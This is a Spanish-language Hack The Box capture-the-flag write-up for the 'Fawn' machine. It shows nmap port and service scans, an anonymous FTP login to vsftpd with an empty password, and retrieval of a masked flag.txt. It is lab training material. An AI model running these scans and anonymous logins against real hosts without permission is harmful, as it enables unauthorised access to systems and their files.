@@ -1,0 +1,159 @@
+---
+type: writeup
+title: Fawn
+description: Explora el Protocolo de Transferencia de Archivos (FTP) y su explotación cuando se configura incorrectamente para permitir el acceso anónimo.
+lang: es
+draft: false
+image: ../../../../images/writeups/hackthebox/machines/fawn/fawn.png
+platform: hackthebox
+url: https://app.hackthebox.com/machines/Fawn
+difficulty: veryeasy
+os: linux
+hints: [ftp]
+tags: [ftp]
+---
+
+## Enumeration
+
+Escaneamos todos los puertos con `nmap` para ver cuáles están abiertos y qué servicios corren en ellos.
+
+```bash
+sudo nmap -p- -sS --min-rate 5000 -Pn -n -vv -oA nmap/allports 10.129.1.14
+```
+
+```plaintext
+PORT   STATE SERVICE REASON
+21/tcp open  ftp     syn-ack ttl 63
+```
+
+Escaneamos el puerto abierto para ver más detalles del servicio que está corriendo en él.
+
+```bash
+nmap -p 21 -sCV -oA nmap/openports 10.129.1.14
+```
+
+```plaintext
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.15.57
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+Service Info: OS: Unix
+```
+
+## Exploitation
+
+El servicio FTP permite iniciar sesión de forma anónima. Nos conectamos a él. Cuando nos pide el nombre del usuario ingresamos `anonymous` y la contraseña la dejamos vacía.
+
+```bash
+ftp 10.129.1.14
+```
+
+```plaintext
+Connected to 10.129.1.14.
+220 (vsFTPd 3.0.3)
+Name (10.129.1.14:melvin): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp>
+```
+
+Una vez conectados con el comando `help` vemos todos los comandos que podemos usar.
+
+```bash
+help
+```
+
+```plaintext
+Commands may be abbreviated.  Commands are:
+
+!		dir		macdef		proxy		site
+$		disconnect	mdelete		sendport	size
+account		epsv4		mdir		put		status
+append		form		mget		pwd		struct
+ascii		get		mkdir		quit		system
+bell		glob		mls		quote		sunique
+binary		hash		mode		recv		tenex
+bye		help		modtime		reget		trace
+case		idle		mput		rstatus		type
+cd		image		newer		rhelp		user
+cdup		ipany		nmap		rename		umask
+chmod		ipv4		nlist		reset		verbose
+close		ipv6		ntrans		restart		?
+cr		lcd		open		rmdir
+delete		lpwd		passive		runique
+debug		ls		prompt		send
+```
+
+Para ver que hace cada comando se lo pasamos como argumento al comando `help`.
+
+```bash
+help ls
+```
+
+```plaintext
+ls        	list contents of remote directory
+```
+
+Listamos el contenido del directorio en el que nos encontramos dentro del servicio `ftp`.
+
+```bash
+ls
+```
+
+```plaintext
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
+226 Directory send OK.
+```
+
+Descargamos el archivo `flag.txt` con el comando `get`.
+
+```bash
+get flag.txt
+```
+
+```plaintext
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for flag.txt (32 bytes).
+226 Transfer complete.
+32 bytes received in 0.0016 seconds (19.0242 kbytes/s)
+```
+
+Cerramos la sesión de ftp.
+
+```bash
+bye
+```
+
+```plaintext
+221 Goodbye.
+```
+
+Y leemos el contenido de la flag.
+
+```bash
+cat flag.txt
+```
+
+### Flag
+
+<Callout type="success" title="Flag">
+0******************************5
+</Callout>
